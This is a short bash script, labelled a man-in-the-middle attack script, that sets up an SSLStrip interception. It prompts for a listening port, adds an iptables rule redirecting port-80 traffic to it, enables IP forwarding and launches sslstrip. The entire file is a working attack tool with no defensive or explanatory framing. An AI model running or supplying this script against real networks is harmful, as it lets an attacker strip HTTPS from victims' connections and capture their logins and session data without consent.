#! /bin/bash
# Mitmf ( man in middle attack script )withe SSLStrip 
# Date: 07/05/2016
sleep 0.05
echo "$( tput setaf 6) ..........................................................$(tput sgr0)"
echo ""
sleep 0.05
echo " $( tput setaf 1)[$(tput sgr0)$( tput setaf 2)~$(tput sgr0)$( tput setaf 1)] $(tput sgr0)What is the $(tput bold)Port$(tput sgr0) would like to use for Listening $( tput setaf 1)?$(tput sgr0)"
read port
echo ""
sleep 0.05
echo "  $( tput setaf 1)[$(tput sgr0)$( tput setaf 2)You'r ready To Rock$(tput sgr0) ^__^  $( tput setaf 1)]$(tput sgr0)" 

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port &echo "1" > /proc/sys/net/ipv4/ip_forward &sslstrip -f -l $port
